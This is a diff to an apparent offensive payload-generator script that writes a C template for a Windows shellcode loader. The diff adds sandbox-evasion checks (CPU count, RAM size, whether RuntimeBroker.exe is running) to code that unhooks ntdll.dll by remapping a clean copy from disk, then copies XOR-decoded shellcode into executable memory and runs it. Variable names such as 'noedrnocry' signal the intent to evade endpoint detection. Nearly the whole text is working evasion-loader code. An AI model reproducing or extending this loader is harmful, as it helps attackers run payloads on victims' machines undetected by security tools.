@@ -31,37 +31,75 @@ def create_template():
     template.write(
     r'''#include <windows.h>
 #include <stdio.h>
-#include <iostream>
-#define MULTI_LINE_STRING(a) #a
-#pragma comment(linker, "/INCREMENTAL:YES")
 #pragma comment(lib, "user32.lib")
 #define WIN32_LEAN_AND_MEAN
-#define MAX_BUFFER_SIZE 512
-#define SECURITY_WIN32
-#define __WIN32_WINNT 0x0A00
-#include <secext.h>
-#include <security.h>
 #include <iostream>
+#include <tlhelp32.h>
 #include <winternl.h>
 #include <psapi.h>
 
 #define UNICODE
 
+		BOOL greenCardHuseyin() {
+		  SYSTEM_INFO inf;
+		  MEMORYSTATUSEX memStat;
+		  DWORD proc;
+		  DWORD belleq;
+		  GetSystemInfo(&inf);
+		  proc = inf.dwNumberOfProcessors;
+		  if (proc < 2) return false;
+		  memStat.dwLength = sizeof(memStat);
+		  GlobalMemoryStatusEx(&memStat);
+		  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
+		  if (belleq < 2) return false;
+		  return true;
+		}
+			
+			
+
+		BOOL AppisRunning(CHAR *app) {
+		    BOOL bResult = FALSE;
+		    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		    PROCESSENTRY32 pe32;
+		    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+		    if(Process32First(hSnap, &pe32)) {
+			do {
+			    if(strcmp(pe32.szExeFile, app) == 0) {
+				bResult = TRUE;
+				break;
+			    }
+			} while(Process32Next(hSnap, &pe32));
+		    }
+
+		    CloseHandle(hSnap);
+
+		    return bResult;
+		}
+
 
 int main(int argc, char** argv)
 {
-    
 
+    if(!AppisRunning("RuntimeBroker.exe")) {
+
+    } else {
+    	
+    if (greenCardHuseyin() == false) {
+    return -2;
+    }
+    else{
+    
         HANDLE process = GetCurrentProcess();
         MODULEINFO modi = {};
-        HMODULE ntMod = GetModuleHandleA("ntdll.dll");
+        HMODULE ntdll_handle = GetModuleHandleA("ntdll.dll");
 
         unsigned char buf[] = " ";
         char key[] = " ";
         char shellcode[sizeof buf];
         int j = 0;
 
-        GetModuleInformation(process, ntMod, &modi, sizeof(modi));
+        GetModuleInformation(process, ntdll_handle, &modi, sizeof(modi));
         LPVOID ntdllBase = (LPVOID)modi.lpBaseOfDll;
         HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
@@ -88,19 +126,20 @@ int main(int argc, char** argv)
             }
         }
 
-        void* bigedrenergy = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        memcpy(bigedrenergy, shellcode, sizeof shellcode);
-        ((void(*)())bigedrenergy)();
+        void* noedrnocry = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(noedrnocry, shellcode, sizeof shellcode);
+        ((void(*)())noedrnocry)();
+
 
         CloseHandle(process);
         CloseHandle(ntdllFile);
         CloseHandle(ntdllMapping);
-        FreeLibrary(ntMod);
+        FreeLibrary(ntdll_handle);
 
         return 0;
     }
-
-
+}
+}
 
 ''')
     template.close()
@@ -110,8 +149,6 @@ def slayer(payload_type, ip, port, arch):
     xorkey = get_random_string()
     buf = get_random_string()
     shellcode = get_random_string()
-    monitorinfo = get_random_string()
-    systemInfo = get_random_string()
     ntdllFile = get_random_string()
     ntdllMapping = get_random_string()
     ntdllMAddress = get_random_string()
